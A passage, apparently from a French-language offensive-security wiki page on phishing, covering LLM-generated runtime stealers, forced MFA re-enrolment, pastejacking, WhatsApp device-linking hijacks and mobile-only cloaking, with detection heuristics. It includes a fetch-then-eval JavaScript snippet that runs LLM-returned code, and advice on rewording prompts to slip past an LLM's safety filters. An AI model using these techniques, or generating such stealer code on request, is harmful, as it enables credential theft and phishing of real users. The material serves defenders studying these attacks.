Les attaquants peuvent diffuser du HTML d’apparence anodine et **générer le stealer à l’exécution** en demandant du JavaScript à une **API LLM de confiance**, puis en l’exécutant dans le navigateur (par exemple, avec `eval` ou une balise `<script>` dynamique).<sup>[[8]](#references)</sup>

1. **Le prompt comme obfuscation :** encoder les URL d’exfiltration et les chaînes Base64 dans le prompt ; modifier sa formulation pour contourner les filtres de sécurité et réduire les hallucinations.
2. **Appel API côté client :** au chargement, le JavaScript appelle un LLM public (Gemini/DeepSeek/etc.) ou un proxy CDN ; seul le prompt et l’appel API figurent dans le HTML statique.
3. **Assemblage et exécution :** concaténer la réponse et l’exécuter (code polymorphe à chaque visite) :

```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
  .then(r=>r.json())
  .then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```

4. **Phish/exfil :** le code généré personnalise le leurre (p. ex., parsing de token LogoKit) et envoie les identifiants à l’endpoint caché dans le prompt.

**Caractéristiques d’évasion**
- Le trafic passe par des domaines LLM bien connus ou des proxys CDN réputés, parfois via des WebSockets vers un backend.
- Aucun payload statique ; le JavaScript malveillant n’existe qu’après le rendu.
- Les générations non déterministes produisent des stealers **uniques** pour chaque session.

**Pistes de détection**
- Exécuter des sandboxes avec JavaScript activé ; détecter les appels à `eval` ou la création dynamique de scripts à l’exécution à partir de réponses de LLM.
- Rechercher les requêtes POST du front-end vers des API LLM immédiatement suivies d’un appel à `eval` ou `Function` sur le texte renvoyé.
- Déclencher une alerte en cas de domaines LLM non autorisés dans le trafic client, suivis de requêtes POST d’identifiants.

---

## Variante de MFA Fatigue / Push Bombing – Réinitialisation forcée
Outre le push bombing classique, les opérateurs **forcent simplement l’enregistrement d’un nouveau MFA** pendant l’appel au service d’assistance, invalidant ainsi le token existant de l’utilisateur. Toute demande de connexion ultérieure semble légitime à la victime.

```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```

Surveillez les événements AzureAD/AWS/Okta où **`deleteMFA` + `addMFA`** se produisent **à quelques minutes d’intervalle depuis la même IP**.



## Clipboard Hijacking / Pastejacking

Les attaquants peuvent copier discrètement des commandes malveillantes dans le presse-papiers de la victime depuis une page web compromise ou typosquattée, puis inciter l’utilisateur à les coller dans **Win + R**, **Win + X** ou une fenêtre de terminal, exécutant ainsi du code arbitraire sans téléchargement ni pièce jointe.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Phishing mobile et distribution d’applications malveillantes (Android et iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Détournement de l’association d’un appareil WhatsApp par QR code et ingénierie sociale
* Une page leurre (par exemple, un faux « canal » d’un ministère ou d’un CERT) affiche un QR code WhatsApp Web/Desktop et demande à la victime de le scanner, ajoutant discrètement l’attaquant comme **appareil associé**.<sup>[[12]](#references)</sup>
* L’attaquant obtient immédiatement une visibilité sur les conversations et les contacts jusqu’à la suppression de la session. Les victimes peuvent ensuite voir une notification « nouvel appareil associé » ; les défenseurs peuvent rechercher les événements inattendus d’association d’appareils survenus peu après la visite de pages QR non fiables.

### Phishing ciblant les mobiles pour échapper aux crawlers et aux sandbox
Les opérateurs conditionnent de plus en plus leurs flux de phishing à une simple vérification de l’appareil, afin que les crawlers de bureau n’atteignent jamais les pages finales. Un schéma courant consiste en un petit script qui vérifie si le DOM prend en charge le tactile et transmet le résultat à un point de terminaison du serveur ; les clients non mobiles reçoivent une erreur HTTP 500 (ou une page blanche), tandis que les utilisateurs mobiles accèdent au flux complet.<sup>[[7]](#references)</sup>

Extrait minimal côté client (logique typique) :

```html
<script src="/static/detect_device.js"></script>
```

Logique de `detect_device.js` (simplifiée) :

```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
  .then(()=>location.reload());
```

Comportement du serveur souvent observé :
- Définit un cookie de session lors du premier chargement.
- Accepte `POST /detect {"is_mobile":true|false}`.
- Renvoie une erreur 500 (ou un contenu de substitution) aux GET suivants lorsque `is_mobile=false` ; ne sert le contenu de phishing que si `true`.

Heuristiques de recherche et de détection :
- Requête urlscan : `filename:"detect_device.js" AND page.status:500`
- Télémétrie Web : séquence `GET /static/detect_device.js` → `POST /detect` → HTTP 500 pour les appareils non mobiles ; les parcours légitimes des victimes mobiles renvoient un code 200, suivi de HTML/JS.
- Bloquez ou examinez les pages dont le contenu dépend exclusivement de `ontouchstart` ou de vérifications similaires du type d’appareil.

Conseils de défense :
- Exécutez les crawlers avec des empreintes similaires à celles d’un mobile et JavaScript activé pour révéler le contenu masqué.
- Déclenchez une alerte en cas de réponses 500 suspectes après un `POST /detect` sur des domaines récemment enregistrés.

## References

- [1] [Génération de variantes de domaines utilisées dans le phishing (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Détecter le phishing : outils et techniques (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Voler des identifiants et contourner la 2FA avec noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Vol de sessions et contournement de la 2FA avec EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Comment installer et configurer DKIM avec Postfix sur Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Rapport mondial 2025 de Unit 42 sur la réponse aux incidents – Édition ingénierie sociale](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Smishing silencieux – infrastructure de phishing réservée aux mobiles et heuristiques (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [La nouvelle frontière des attaques par assemblage à l’exécution : exploiter les LLM pour générer du JavaScript de phishing en temps réel](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Usurpation d’identité, détournement de clics et TDS : au cœur d’un écosystème de distribution de malwares](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting sur Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Détournement du trafic vers le windows.com de Microsoft par inversion de bits (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [L’amour ? En réalité : une fausse application de rencontre utilisée comme leurre dans une campagne de logiciels espions ciblée au Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [IoC et échantillons d’ESET GhostChat](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
